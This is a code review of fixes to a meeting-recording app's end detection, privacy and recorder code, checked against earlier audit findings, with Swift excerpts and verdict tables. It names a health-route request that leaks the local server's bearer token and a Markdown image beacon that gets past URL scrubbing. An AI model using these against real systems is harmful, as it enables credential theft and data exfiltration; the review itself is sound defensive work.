# Review of the fixes landed after the audit, 2026-11-17

Between the audit filing (`975ef18d`, 2026-11-14) and `78b72306` (2026-11-17 01:35) parallel sessions landed 77 commits covering 63 backlog tasks, about 38,000 changed lines. The owner asked for that work to be checked against the audit findings it claims to fix. This file is the result. Nothing was changed, filed or fixed; companion to `2026-11-12-independent-audit.md`.

How it was done: the full CI gate was run on main, and five review sessions (four on Opus, one on Sonnet) read the code at the pinned commit `78b72306`, one per area, each checking every task against its spec, its audit finding, its acceptance bullets and whether its tests would fail without the fix. They built and ran nothing, so every judgement on a test is by reading. The seven findings marked "re-read" below were then checked in the code by the coordinating session. Two commits landed after the pin (an END22 note and a CI test fix) and are not reviewed.

## Verdict

**The work is real and mostly sound: no fix was found to be a regression, and none simply fails to do what it says.** Of 63 tasks, 30 hold as described, 32 hold with gaps, and one (SEC27) has a leg that does not hold. The gaps are mostly routes the fix did not reach, not wrong fixes. Task statuses are honest almost everywhere: most are marked partial with the real remainder named. The pattern the audit warned about (recorded as done, not holding) shows up once, in SEC28.

The CI gate is green on main at `e3b034c4`: fences, design tokens and truth fences pass; ruff and pyright are clean; 1,851 pipeline tests pass (1,559 at the audit); 4,174 daemon tests pass (3,531 at the audit) with one allow-listed skip; the engine-bounds suite, the signing-key check and the relocation smoke pass. The build prints about 28 distinct compiler warnings, about eight of them concurrency diagnostics that Swift 6 mode would reject (four at the audit).

## What to fix first

Ordered by harm, each small. "Re-read" means the coordinating session confirmed the snippet and the path in the pinned code.

1. **SEC27, re-read: the local model server's bearer token can be read from its unauthenticated health route.** The bearer is `HMAC(token, "mp-local-server-bearer-v1")` and the health proof is `HMAC(token, nonce)`; the label is itself a valid nonce, so `GET /health?nonce=mp-local-server-bearer-v1` returns the bearer to any local process. The model pin still blocks code execution, so the exposure is free inference and interference with a running summary. Fix: one line of domain separation between the two HMACs, plus a test. Details: privacy report, M1.
2. **SEC39, re-read: an NDA workflow picked by hand can be dropped twice.** `WorkflowMatcher.resumeWorkflow` returns the rule match whenever a rule matched, so a call recorded under a hand-picked NDA workflow resumes after a weak end under a non-NDA rule. Separately, when a prompt times out into the new one-click offer, `clearPromptRouting(exit: "timeout")` discards the chip pick, so the offer records under the rule match. Fix: never resume weaker than the previous workflow when it was NDA; carry the pick into the offer for the same source. Details: session report, M1 and M6.
3. **END19 with END21, re-read: a trim armed by an ignored end is applied to the next stop.** `resolveTeardownHold` sets `pendingEndTrimAt` before `handleMeetingEnded` decides to ignore the end (`meeting_end_ignored_other_app`, `meeting_end_ignored_sourceless`), and nothing clears it. A later Stop then cuts the transcript at a foreign hold's first stamp, and under NDA or regulated capture truncates the audio. Fix: clear the pending trim wherever an end leaves the recording running. Related: a sourced recording can end up on another app's engine because the engage is skipped as `already_engaged` without comparing bundles. Details: session report, M3 and M2.
4. **END29, re-read: one Leave flicker defeats the new backstop.** The refusal that keeps a mic-led hold from lone-confirming is a level read on every tick, and `loneSince` does not move when the refusal lifts, so after 12 minutes of hold a single Leave-invalid reading (a screen-share re-render) ends the call on the next tick and the transcript is cut back to the hold's start. The ship note says the call would run 12 more minutes; it would not. Fix: restart the lone dwell when the contradiction lifts. Details: lifecycle report, M1.
5. **SEC28, re-read, marked done: three model-written fields still reach the Markdown sinks unscrubbed.** `ActionItem.due` has no validator and is written straight into `summary.md` and the Obsidian note; `owner` and `attendees` pass only a literal `https?://` check that an entity-encoded scheme beats. This is the same remote-image beacon the task closed for the other fields, and it works under NDA. The task should go back to partial. Details: privacy report, M2.
6. **DIAR11: the new owner pick trusts a voiceprint that was built by the old, wrong selection.** On disagreement the stored print wins, nothing validates or resets it, enrolment is capped at 12 meetings and now also needs agreement with that same print, so a contaminated print can never correct itself. On the work laptop about a quarter of the old picks were on a non-matching cluster. Before relying on the fix there: reset the voiceprint, then re-finalize. Two more gaps: with no print, an owner split into two mic-side clusters is left unnamed and unenrolled; after a microphone change the print never adapts. The 15 s floor and 25% runner-up share are provisional and unvalidated, and the task says so. Details: simpler-fixes report, findings 1, 2 and 12.
7. **END16, re-read, known as G053: a Teams teardown line can confirm a hold that belongs to another app.** `TeardownHoldPolicy.consult` gates on `kind == .native` only, so a Zoom hold under a live microphone can be ended by an unrelated Teams call registering and unregistering. The one-line Teams-family gate is listed as remainder and still owed. Details: lifecycle report, M3.
8. **REC32 and REC34 widen an older gap: orphan recovery merges with no head offset and no trim.** A recording whose far side started late and which is then recovered has the other side placed seconds too early in the transcript. More recordings take this path now. Fix: persist the head offset and trim at stop and pass them through `recoverOrphan`. Details: recorder report, M1.
9. **END14 with END24 and END30: a locked window that outlives the call removes the whole call-window class from the end decision.** Teams then ends at the 120 s ceiling instead of 60 s; Zoom has no ceiling and ends at the 720 s lone dwell. Details: lifecycle report, M2.
10. **The fixed 60-second Teams end is unchanged**, and four comments still say the teardown confirms at once. None of the landed tasks changes that route; END16 only instruments it. Details: lifecycle report, M4.

Smaller points worth knowing: the detection auditor `mp analyze-detection` counts an ignored foreign end as the stop, which hides exactly what the END19 and END21 owner checks look for (session report, M7); DET21's epoch guard silently drops the leaked-listener deliveries its own field check is meant to count (recorder report, M2); PERF11's stall watchdog pings every 250 ms against a 100 ms threshold, so it misses most of the stalls it was built to log (simpler-fixes report, 4); renaming a speaker in one meeting can split a person into two near-identical roster entries (simpler-fixes report, 3); SEC17's hardened runtime is in, but the owner's existing signing key stays open to any application until four manual Keychain steps are done.

## Would the field incidents still happen?

| Incident from the audit | At the pinned commit |
|---|---|
| Resumed recording with no end detection for 380 s (2026-11-12) | No. END27 holds the first window-gone reading for the microphone and re-engages a terminal engine at record start. |
| Unanswered prompt becomes Skip, call unrecorded (32 of 32) | Partly. The timeout now leaves a one-click offer for the call's length and arms no latch, but nothing records without a click unless the unanswered-prompt action is set to Record. |
| Google Meet tab titled by the meeting name gets no prompt | Fixed for the selected tab of an on-screen window. Still no prompt for a background tab or window. |
| Teams window-title change chopping recordings (2026-10-08) | Fixed for the normal case: the call window is locked by identity. Residual in item 9 above. |
| Hold of 40 minutes with no Leave button, then a cut at the first signal (G001) | The cut is now at the microphone release for apps with process audio, so the 40 minutes are kept. The first-stamp cut remains, by the owner's decision, for browsers, Webex and Slack, and in the new form of item 3. |
| Hand-started recording ended by a stale browser engage (2026-11-11) | Fixed for that shape; the later hand stop is misreported by the auditor. |
| Every Teams end waiting 60 s | Still happens. |
| Stale Teams log line outranking the live mute button | Not reviewed: no landed task addresses it (MIC24 is still open). |
| Record click showing nothing for about a second | The capture file is now created off the main thread (PERF28). The visible Starting state (UX106) has not landed. |

## Verdict by task

| Area | Holds | Holds with gaps |
|---|---|---|
| Lifecycle engine | END22, END27 | END14, END16, END17, END18, END24, END29, END30 |
| Session host and start | END23, DET13, DET22 | END19, END20, END21, END28, DET14, DET17, DET18, DET19, SEC39 (and the unlabelled fix `1f6fdfc0`) |
| Privacy and egress | SEC20, SEC26, SEC30, SEC32, SEC33, SEC36, SEC37 | SEC18, SEC23, SEC28, SEC35; SEC27 (bearer leg does not hold) |
| Recorder and concurrency | REC18, REC21, REC22, REC30, REC34, PERF28, CONC6, CONC7, CONC8, CONC11, CONC12, DET23 | REC32, CONC5, DET21 |
| Simpler fixes | PERF30, PERF31, DIST8, SEC31, REC31, REC33 | PERF9, PERF11, PERF12, SEC17, SEC21, SEC22, PIPE41, FEAT24, DIAR11 |

Status that should change: SEC28 from done back to partial. Everything else marked done was found done.

## Limits

- Reading only. No reviewer built or ran anything; test quality is judged by reading the test and the pre-fix code, and several test bodies were taken from ship notes (named in each report).
- The reviewers ran on cheaper models than the audit. Seven findings were re-read by the coordinating session; the rest rest on one reviewer each, with no separate skeptic.
- No field data: the work-laptop pack was deleted, so nothing here says how the fixes behave in real calls. Most tasks are partial precisely because an owner-run check is owed.
- Not covered: rendered UI, permission-gated paths, a live call, the two commits after the pin, and MIC24, UX106 and the other audit tasks that have not landed.

The five area reports follow unedited.

## Area report: lifecycle engine

Pinned tree: detached worktree at `78b72306`. Read-only review; nothing built or run. Every test judgement below is "by reading" (the pre-fix code read with `git show <hash>^:`), not by execution. Field facts are quoted from the 2026-11-12/13 audit files, not re-measured.

### Verdicts

| Task | Commit(s) | Verdict |
|---|---|---|
| END14 (amendment) | `80a4d7c5` | holds with gaps |
| END16 | `68c68444` | holds with gaps |
| END17 (amendment 7, 8, 11) | `e9e59b06` | holds with gaps |
| END18 | `c86fb944` | holds with gaps |
| END22 | `27412d61` | holds |
| END24 | `96355f23` | holds with gaps |
| END27 | `91bfcdff` | holds |
| END29 | `2353c73d`, `2ab9b377` | holds with gaps (one route left open, and the ship note misstates it) |
| END30 | `22a4e813`, `8193f420` | holds with gaps |

**END14 (amendment F031, G024, F158).** `pairEdges` now counts a class only on a member edge inside the hold or at most 2 s before it, and only while no class-mate reads `.live`; the two title kinds are one `.meetingTitle` class. The audit's scenario (window minimised at minute 2, a 60 s mic drop at minute 22, Leave healthy) no longer pairs, and the rewritten G024 test (`test_real_end_after_a_veto_takes_the_process_audio_path_END14`) fails on the pre-fix engine, which confirmed at `600 + dwell` through the 599 s old window stamp. Two gaps: the contradiction rule is symmetric, so a call window that reads present removes the whole call-window class, Leave included, which with END24/END30's lock turns a 60 s pair into END23's 120 s ceiling on Teams and the 720 s lone dwell on Zoom (M2; `test_a_present_window_contradicts_an_invalid_leave_END14` pins that as intended). And "fresh" is measured against the hold's start, so a long Leave-led hold keeps its opening edge fresh for its whole life (L2).

**END16.** The watcher legs hold: one repeating timer on the read queue, a `stat(2)` per tick with a listing every 10 s or on a Teams launch, the tail kept across a failed listing (F160: `current`, `offset` and `pending` survive the failure branch, and `tail` reads the tailed generation when the listing fails), per-cause hourly rate limiting with recovered rows, and `call_teardown_line` rows with the line's own time. `testALineWrittenAcrossAFailedListingIsStillRead` (read) splits an `UnregisterCall` line across a failed listing and asserts the teardown is seen; the pre-fix tick nil'd `current` and skipped to end of file, so it fails there. The other watcher tests were not read; their quality is the ship note's claim. It does not touch the field symptom it was amended for (every Teams end waits 60 s): that fix waits on measurement, and the hold-side half of that measurement (the per-consult rows, the blind-consult count) did not ship. G053 is still open at the pin (M3).

**END17 (items 7, 8, 11).** `NativeLifecycleAdapter` now starts a `WorkspaceSignal` for the started context's exact bundle, so a native quit is definitive; a running process-audio reading whose owners vanish or turn unreadable becomes `.unknown` after one re-resolve, and the engine takes it only over `.live`, which lifts the veto inside an open hold and restarts the lone dwell. The G028 residual is handled by the owner-tracking reduce (an unreadable owner beside readable idle helpers is unknown, not false). `NativeAppQuitTests` now drives the quit through the real `WorkspaceSignal`, adapter and coordinator under a live mic (the G025 complaint), though it enters at `handleTerminated` rather than through a workspace notification. Gaps: the owner probe (item 9) is still owed, so the frozen veto stays "possible, not observed"; item 10 (G026, the single-source regulated cut) is unshipped, gated on MIC18; an end the veto absorbed in `.inMeeting` is never re-evaluated when the veto lapses (L1); the quit matches bundle id, not pid (L3).

**END18.** All five items are in the code: a same-class or returning `.live` reverts only while no other class ended inside the hold, the rescue reaches the engine through `reassertOrArm`, the Leave probe is three-valued, and `loneSince` carries the lone-dwell anchor. Per its ship note (test bodies not read), `LeaveRescueAdapterTests` composes the real signal and adapter and is the red proof the rescue reaches the engine; the era-1 corpus trace passes on the pre-END18 engine too (its ship note says so). Gap: the anchor moves on a vetoer's release and on a declined revert, never when a contradicting Leave reading stops contradicting, which is what makes M1 possible for both `leadClassContradicted` and END29's refusal.

**END22.** Dwells and END27's grace are measured with the engagement's sleeps subtracted (`awake(from:to:)`), stamps stay wall-clock so END21's cut positions do not move, a wake gates every confirm on a fresh post-wake reading (the vetoer's own where the adapter publishes one) or 10 s awake, the coordinator detects the sleep from the wall/uptime gap so its first tick cannot beat `didWake`, and `ProcessAudioSignal.refresh` force-delivers rather than clearing `lastValue`, which keeps END17's unknown path reachable after a sleep. I found no state without an exit: the gate clears itself after 10 s awake. `PromotionEngineWakeTests` (read) assert behaviour on a virtual clock (no confirm on waking, a fresh reading then the remaining awake dwell). Scope of this verdict: engine, coordinator and `ProcessAudioSignal.refresh` read; the host half (`SleepWakeObserver`, `ResumeAfterEnd`'s uptime window and wall cap, the backstop's sample-gap restart) not read. The owner walkthrough and the 10 min resume wall cap answer are owed.

**END24.** Option 1 as specified: one recognizer (`MeetingTitlePatterns.teamsWindow`) for the scanner and the end side, and the window signal locks the call window's SCWindow ids at the first present reading and reads gone only when they leave the on-screen list. That removes the 2026-10-08 false reading for the normal case. Gaps: which windows get locked is decided once per engagement by a title rank, and every route where a non-call window wins (rank ties lock all best-rank windows; the rank-2 `Chat | ...` main window locks when nothing better is on screen) leaves a reading that stays present after the call, which costs the end its call-window class (M2). A mid-call recreation of the call window reads gone for the rest of the session (logged as `appeared_matching`, never re-locked), a lost vote by design.

**END27.** The core half holds the 2026-11-12 race: in `.starting`, a reliable end waits for the vetoer's first reading when the adapter publishes one (`awaitsVetoerReading`), a live first reading vetoes it and logs `end_vetoed`, a release lifts it, and `vetoerGrace` (2 s awake) bounds a vetoer that never reports. The app half re-engages a terminal engine at record start (`isTerminal`, `lifecycle_reengaged`). `TerminalEngineReengageTests` drives the controller end to end and asserts the later leave opens a hold. The corpus trace is synthetic (owner extraction owed), and the core half covers only adapters with process audio (Teams, Zoom); the re-engage covers every app.

**END29.** `micLeadContradicted` refuses the lone dwell for a mic-led hold while the Leave button reads live and no other class has a fresh, uncontradicted edge. The tests are behavioural and two fail on the pre-fix engine by reading. But the refusal is a level read on every tick against an anchor that never moves when it lifts, so one Leave-invalid reading inside a mic-led hold older than `loneDwell` ends the call on the next 0.25 s tick (M1); the ship note's residual ("ends 12 minutes after the flicker") is wrong. For Teams, END23's monitor ceiling is consistent with this task (it sees the return the engine missed), so it neither helps nor conflicts here.

**END30.** Zoom runs END24's identity mode with a shared, permissive recognizer and a rank that prefers a "Zoom Meeting" title. The spec's acceptance tests are present by name (bodies not read). Gaps: all titles are seeded (no capture yet); the same lock-selection risk as END24, sharper for Zoom because the rank has only two levels and any accepted window ties at rank 1 when no meeting-titled window is on screen (M2); and the start-side Zoom predicate widened from "contains zoom meeting" to "any non-chrome Zoom window", a start-side behaviour change outside the spec's scope (L4).

### Findings by severity

#### M1 (medium; incomplete fix, not a regression; code-derived, precondition unobserved). A Leave flicker lifts END29's refusal with the lone dwell already run out, so the backstop ends a live call at once

Calibration: before END29 the same hold ended at T + 720 s regardless, so the outcome below is never earlier than the pre-END29 one. The point is that END29's protection does not hold on this route, and its ship note says it does for 12 more minutes.

File: `daemon/Sources/MeetingPipeCore/Lifecycle/PromotionEngine.swift`, `tick(at:)` and `handleEndingProvisional`.

```swift
let micLeadContradicted = leading.vetoesLoneEnd
    && leave?.state == .live
    && !(leave?.declined == true && (leave?.at ?? .distantPast) >= startedAt)
    && !Self.pairEdges(in: states, holdStartedAt: startedAt).keys.contains { $0 != leading.evidenceClass }
let loneHeld = !leadClassContradicted && !micLeadContradicted && awake(from: loneSince, to: now) >= loneDwell
```

and in the `.ended` arm of `handleEndingProvisional`, the only anchor move:

```swift
let anchor = (event.kind.vetoesLoneEnd && previous?.state == .live) ? event.timestamp : loneSince
```

Scenario (END29's own precondition, then a common event): a headphone switch at T releases the mic, the engine opens a mic-led hold and misses the return (the stale-object case END29 exists for). The call goes on with Leave and window live, so the refusal holds through T + 720 s, as `test_a_missed_mic_return_does_not_lone_confirm_while_the_leave_reads_live_END29` pins. At T + 20 min the owner starts a screen share; Teams re-renders, the Leave element reads invalid (the reliability audit counts 3 Leave-flicker holds across the 6 newest-build recordings, standing 5.5, 8.3 and 38.3 s under a live mic before reverting), far longer than one 0.25 s tick. The `.ended` arm records it and leaves `loneSince` at T. On the next 0.25 s tick `leave?.state == .live` is false, so `micLeadContradicted` is false, and `awake(T, now)` is 1200 s, so `loneHeld` is true: `.ended` with `confirmed_by: [ax_leave_button_invalid, lone_dwell]`, and END21 cuts at T, removing 20 minutes from the transcript of a call that is still running. END23's ceiling does not stop it first, because in this scenario the monitor sees the mic held. `leadClassContradicted` (END18, window-led) has the same shape. Fix direction: when a refusal lifts, count the lone dwell from that moment (move `loneSince` to the Leave reading's ended stamp when the Leave was the live contradiction), or require the lifting reading to stand for `confirmDwell`. `test_the_leave_going_invalid_lifts_the_refusal_END29` only covers a flicker 30 s into the hold, so it cannot see this.

#### M2 (medium). END14's symmetric contradiction plus END24/END30's lock selection can remove the call-window class from every pair for a whole engagement

Files: `PromotionEngine.swift` `pairEdges`; `ShareableContentSignal.swift` `evaluate`; `LifecycleAdapter.swift` `teamsLockRank`, `zoomLockRank`.

```swift
let contradicted = live.contains { other in
    other.key.evidenceClass == cls
        && !(other.value.declined && other.value.at >= holdStartedAt && reading.at <= other.value.at)
}
```

```swift
if let best = lockable.map({ lockRank($0.title) }).min() {
    toLock = lockable.filter { lockRank($0.title) == best }
}
```

A window reading `.live` contradicts a Leave-invalid edge. If the locked set holds a window that outlives the call, mic plus Leave can never pair, and the end falls to the lone dwell (refusal lifted, since Leave is invalid). Routes to such a lock, all decided once at the first present reading and never revisited: the rank-2 `Chat | ...` main window when no better Teams window is on screen at that moment (call window minimised or on another Space at engage, an END27 re-engage at record start, a join started from the main window); a rank tie that locks every best-rank window (any other bare-titled Teams window; for Zoom, every accepted window at rank 1 when no window carries "Zoom Meeting", for example a webinar beside a floating panel). Consequence per app: Teams ends at END23's 120 s monitor ceiling instead of the 60 s pair; Zoom has no ceiling and ends at the 720 s lone dwell; if the next Zoom call starts inside those 12 minutes its live mic reverts the old hold, and only END28's call-identity split (outside the nine, not traced here) stands between that and two meetings in one recording. `test_a_present_window_contradicts_an_invalid_leave_END14` pins the 720 s outcome for a present window as intended, `ShareableContentSignalTests.test_only_a_chat_pipe_window_is_locked_when_no_bare_segment_exists` pins the rank-2 main-window lock as intended, and END14's ship note calls the cost "a lost vote, never a false end"; it is two lost votes, the Leave button's included. The END24 field acceptance (window-led `end_vetoed` to 0) would not notice this; counting `shareable_content_window_locked` rows with `rank` 2 or `count` above 1, and Teams or Zoom ends whose `confirmed_by` carries `lone_dwell` or that END23 stopped, would.

#### M3 (medium, open known G053). A Teams teardown line can confirm a non-Teams hold under a live mic

File: `daemon/Sources/MeetingPipeCore/Lifecycle/TeardownHoldPolicy.swift`, `consult`; `PromotionEngine.confirmProvisionalEnd`.

```swift
guard let hold, hold.context.kind == .native else { return nil }
```

`confirmProvisionalEnd` ends any `.endingProvisional` without checking the vetoer. Scenario: a Zoom Leave-led hold under a live mic (a screen-share re-render) consults once a second; Teams is running in the background and registers then unregisters a call after the Zoom recording started (an incoming call declined is a plausible trigger, not verified). The next consult confirms: `.ended` with `call_teardown_observed`, `trimPoint` returns nil because process audio reads live, so the Zoom recording stops mid-call. END16 lists the one-line Teams-family gate as remainder; it is the smallest fix and is still owed.

#### M4 (medium). The fixed 60 s Teams end is unchanged, and four places still claim it costs nothing

Files: `CallTeardownOracle.swift` doc ("the median added latency is zero"), `MeetingSessionController.beginTeardownHold` doc ("the first consult confirms with no added latency at all"), `TeardownHoldPolicy.minimumTrimmedHoldSec` doc ("The normal Teams end confirms on the first consult"), `PromotionEngine.handleInMeeting` comment ("confirmed by Teams' teardown at once on the host"). Field (audit): 0 of 59 Teams lifecycle ends in the whole work-laptop pack (2026-09-29 to 2026-11-13) were confirmed by the teardown line, and in era C all 4 of 4 Teams ends waited 60.01 to 60.08 s on the pair dwell. None of the nine tasks changes the route; END16 only instruments it. The comments read as the design working, which is the claim the audit found false.

#### L1 (low). An end absorbed under the veto is not re-evaluated when the veto lapses to `.unknown`

File: `PromotionEngine.handleInMeeting`, `.unknown` arm:

```swift
        case .unknown:
            // END17: no hold opens on an unreadable read; the veto it held simply lapses.
            phase = .inMeeting(context: context, observed: observed, states: states)
            return nil
```

A window-gone vetoed earlier stays in `states`, the veto lapses, and nothing opens a hold until another `.ended` arrives; signals emit only on change and `tick` is not armed in `.inMeeting`. Scenario: window minimised (vetoed), then Teams' media helper (not the shell, so no app quit) dies with the call, the mic objects vanish (`.unknown`), and the Leave button is unarmed. The recording runs until the idle backstop; END23's ceiling pauses on unknown samples rather than counting them. Narrow precondition; noted because END17's item 8 is described as making the veto "lapse", which it does only for holds already open.

#### L2 (low). The window freshness rule tests against the hold start, so a long hold keeps its opening edge fresh

File: `PromotionEngine.pairEdges`, `let earliest = holdStartedAt.addingTimeInterval(-pairEdgeAllowance)`. In a Leave-led hold that sits under a live mic for 40 minutes (the G001 shape), the minute-0 Leave edge is "inside the hold" for all 40; with the window not live (minimised), any mic drop of 60 s pairs with it. This is the class of stale pairing the END14 amendment removed outside holds. For Teams, END23 would stop at 120 s on the same drop anyway; for Zoom it is the pair.

#### L3 (low). The native app quit matches the bundle id, not the context's pid

File: `Signals/WorkspaceSignal.swift`, `start(context:)` and `defaultProbe`:

```swift
            if app.bundleIdentifier == context.bundleID {
                self.handleTerminated(reason: "workspace_notification")
            }
```

```swift
        NSRunningApplication.runningApplications(withBundleIdentifier: bundleID).first
```

A definitive end has no hold, so a second process with the same bundle id quitting ends the recording at once. No test pins a same-bundle, different-pid quit: `NativeAppQuitTests` calls `workspace.handleTerminated(reason:)` directly, so neither the notification filter nor the KVO path is exercised. Unlikely for Teams and Zoom; cheap to tighten by comparing `processIdentifier` with `context.pid`.

#### L4 (low). END30 widened the Zoom start-side predicate beyond its scope

File: `MeetingSourceScanner.swift`: the Zoom branch went from `return lowered.contains("zoom meeting")` to `return MeetingTitlePatterns.zoomWindow(title)`, which accepts any non-chrome Zoom window. The spec asked the two sides to share one recognizer; the commit chose to widen the start side rather than narrow the end side, on the reasoning that the scorer needs corroboration. A start-side detection change ships under an end-side task with seeded titles only.

#### L5 (low). Stale comments

`MeetingSessionController.swift` around line 1918: "`tick()` demands a cross-class corroborator, and `confirmProvisionalEnd` always appends its re-walk signal" describes the pre-END17 engine. `daemon/docs` and ADR text were not exhaustively re-read for this; the four latency claims are in M4.

### Current end-decision table (from code at `78b72306`)

Signals: W window (`shareableContentWindow`, class call-window-or-control), L Leave (`axLeaveButton`, same class, `requiresCorroboration`), M mic (`processAudioIsRunningInput`, class process-audio, `requiresCorroboration`, the only vetoer), T tab title and WT window title (one class `.meetingTitle`, browser path), Q app quit (definitive). "Reliable" means `yieldsToLiveVeto`: W, T, WT.

| Phase | Event | Outcome | Owner |
|---|---|---|---|
| idle | any `.live` | `.starting` | base |
| idle | `.ended` / `.unknown` | ignored | base |
| starting | `.live` | absorbed; if it is M's first reading and a reliable end was held for it, logs `end_vetoed` | END27 |
| starting | `.unknown` | recorded only over `.live`; decides nothing | END17 |
| starting | Q `.ended` | `.ended` | END17 |
| starting | reliable `.ended`, M live | held, `end_vetoed` | END14 |
| starting | reliable `.ended`, adapter publishes M and M has not reported | held until M's first reading, or `tick` ends it after 2 s awake (not while the wake gate holds) | END27, END22 |
| starting | reliable `.ended`, otherwise | `.ended` | START1 |
| starting | L or M `.ended` | never leads; ends `.starting` if a held reliable end is now unvetoed and not awaiting M | START1, END14 |
| starting / any | W `.ended` within 5 s of a display change | deferred to the settle's end unless a newer W reading supersedes it | END22 |
| inMeeting | `.live`, `.unknown` | recorded; `.unknown` only over `.live` | END17 |
| inMeeting | Q `.ended` | `.ended`, no hold | END17 |
| inMeeting | reliable `.ended`, M live | absorbed, remembered, `end_vetoed` | END14 |
| inMeeting | any other `.ended` (incl. L under a live M) | `.endingProvisional`, `startedAt = loneSince = ts` | END17 |
| endingProvisional | Q `.ended` | `.ended` | END17 |
| endingProvisional | M `.ended` or `.unknown` after `.live` | `loneSince = ts` | END18, END17 |
| endingProvisional | other `.ended` | recorded, no anchor move | END17 |
| endingProvisional | M `.live` | revert to `.inMeeting`, `end_vetoed` | END14 |
| endingProvisional | lead-class or returning `.live`, another class ended inside the hold | declined, `end_revert_declined`, `loneSince = ts`, reading flagged declined | END18 |
| endingProvisional | lead-class or returning `.live`, nothing else ended inside | revert | END8, END17 |
| endingProvisional | other cross-class `.live` | ignored | END17 |
| tick (0.25 s, only while a deadline is pending) | M reads `.live` | nothing | END14, END17 |
| tick | wake gate (no fresh post-wake reading, vetoer's own where published, and under 10 s awake) | nothing | END22 |
| tick | two classes with a pair edge (member ended at or after hold start minus 2 s, no class-mate `.live` except a reading declined in this hold after that edge), each held 60 s awake | `.ended` | END17, END14 |
| tick | `awake(loneSince, now) >= 720 s`, unless W-led with L live and nothing else ended inside, or M-led with L live (not declined in this hold) and no other class pair edge | `.ended`, `lone_dwell` | END17, END18, END29 |
| ended | anything | ignored; terminal. Exits only by `reset` (disengage, a new engage, or END27's re-engage at record start). An engine that goes terminal after a recording's attach and whose end the host ignores (other app, source-less) stays so for that recording | base, END27 |
| host, each 1 s in a hold | teardown line inside the lookback and after recording start, native kind only, veto not consulted | `.ended`, `call_teardown_observed` | END9, END17 (G053 open) |

Outside the nine tasks, listed for composition and not reviewed: END21's trim (cut at M's release where M reported; nothing while M is live), END23's monitor ceiling (native Teams only, stop 120 s into a monitor-observed release, any engine state), the idle backstop (15 min of silence; stands down while the verdict is `.starting` or `.inMeeting`, runs during a hold), END28's call-identity split, and a manual stop.

**Do the rules compose?** Mostly, and the intricate seam (END18's decline, END14's declined exemption, END29's declined exception) is consistent: each reads the declined flag with the same "inside this hold" test. Two compositions do not: the refusal anchors (M1, END18 and END29 against the anchor rule END18 itself introduced) and the symmetric contradiction against the lock (M2, END14 against END24 and END30). END23's ceiling reads a different source and makes END29's refusal matter only when the engine misses a return the monitor sees, which is the case END29 names, so they agree.

### Incident replay

**2026-11-12 resume with no end detection for 380 s.** Would not recur. Order at the engagement: Leave live (`.starting`), window false 16 ms later, mic true 2 ms after that. Now the window-gone is held by `awaitsVetoerReading` (Teams publishes M), the mic's first reading vetoes it and logs `end_vetoed`, the engine stays `.starting`, and the record start's `confirmRecording` reaches `.inMeeting`. At the leave, the mic release opens a mic-led hold, Leave goes invalid 86 ms later inside it, and the pair confirms 60 s after Leave's edge (the window's 15:46 stamp is outside the 2 s allowance). Layers: END27's core hold (Teams and Zoom only), END27's re-engage at record start (every app), END24's lock (the window would likely read present at the first reading), and END23's 120 s ceiling (Teams only, outside the nine). Caveat: the corpus trace is synthetic.

**Every Teams end waiting a fixed 60 s.** Still happens. A clean Teams leave: window gone 0.2 to 0.4 s before the mic (vetoed, remembered, inside the 2 s allowance), mic release opens the hold, Leave invalid within about 2.6 s; the pair needs both classes held 60 s, and the teardown oracle, the only faster route, confirmed 0 of 59 in the field. None of the nine changes that; END16 instruments the watcher side only. If M2's lock route applies, it becomes 120 s (END23).

**2026-10-08 Teams title change making the window read gone on live calls.** Fixed for the normal case: bare-titled call windows pass `teamsWindow`, rank 0, and are locked by id, so the reading stays present while the window is on screen. Even when the reading does go (minimise, other Space, recreation), END14's veto absorbs it under a live mic and END27 holds it in `.starting`. Residuals: M2's lock selection, and a recreated call window reading gone for the rest of the session. Webex and Slack stay on the title rule with no vetoer; a similar change there would now open a hold that END18's `leadClassContradicted` keeps from lone-confirming while Leave reads live, not a chop.

**Leave-button-absent hold of 40 minutes.** The hold still opens and sits: an L `.ended` under a live mic is not vetoed (L does not `yieldsToLiveVeto`), the rescue walks once at open and finds no Leave, and the HUD shows the confirming-end state for the whole stretch. At the real end the mic release moves `loneSince`; L's minute-0 edge counts as fresh (L2), so the pair forms 60 s after the release if the window went too, or END23 stops Teams at 120 s if the locked window still reads present (M2). The 40 minutes are no longer lost, but that is END21's trim (cut at the release), outside these nine; none of the nine stops the hold from opening or sitting.

## Area report: session host and start

Reviewed at the pinned worktree, commit `78b72306`. Read-only: code and diffs were read; nothing was built or run. Test bodies were read for END19 (`StaleEngageTests`), END20 (`StartInFlightTests`, resume and auto-consent origins), END21 (`HeldEndStopRouteTests`, NDA truncation), SEC39 (`PromptRoutingTests`, the resume table), DET18 (`PromptOfferTests`) and DET19 (`test_analyze_detection.py`); "red before the fix" for those is traced by hand against the parent's code. For END23, END28, DET13, DET14 and DET22 only test names and the ship notes' red-run claims were read, so those test judgements rest on the ship notes.

### Verdicts per task

#### END19 (`bd475d68`): holds with gaps

Item 3 is the part that answers the 2026-11-11 incident, and it holds: `ignoresEndForSourcelessRecording()` drops an end whose engage predates `recordingCommittedAt` and never produced an `.inMeeting` verdict while recording, and `test_aStaleBrowserEngagesEnd_doesNotStopAHandStartedRecording` would fail on the parent (the parent's `.recording` branch stops any source-less recording). Item 1 is weaker than the ship note says: `StaleEngageBound.sighted` is fed by every discovery winner, before the held, backoff and cooldown returns, so it tracks "the last winner", not "the engaged bundle", and an engage whose own tab keeps winning (the background-window tab the note calls "the real gap") is never bounded at all. In the incident the engage was 21 s old at the hand start, so the replay rests on item 3 alone; item 1 does not touch it. Item 4's source-less resume is real for natives; for browsers `1f6fdfc0` replaced it with a prompt. Tests for item 1 call `handleScanWithoutWinner()` directly; the wiring is pinned only by a source-text fence.

#### END20 (`a98c0cb7`): holds with gaps

`RecordingStartLatch` replaces the private Bool and is read with no suspension between `resolve()` and `setRecording`, so an end of the start's own app or a Stop during any origin's bring-up now stops the fresh capture before commit (`StartInFlightTests` drives resume, auto-consent, prompt, hotkey and toggle origins; each would commit on the parent). `chooseAlways` is guarded, `beginRecording` refuses from `.recording`/`.stopping` before bumping the build id, and the catch no longer goes idle on `alreadyRecording`. D075's confirm-before-title-read holds. Gaps: `forceStop` during a prompt-origin bring-up both cancels the start and runs the `.prompting` branch (a second `prompt_dismissed`, `skipped` after `accepted`, and a skip hold armed on the call the user had just accepted); every end during a source-less bring-up is dropped, which leaves a hand start on a terminal engine with no row (see findings); D100 and DET1's mic release during bring-up are out of scope and named as such.

#### 1f6fdfc0 (browser resume prompts): holds with gaps

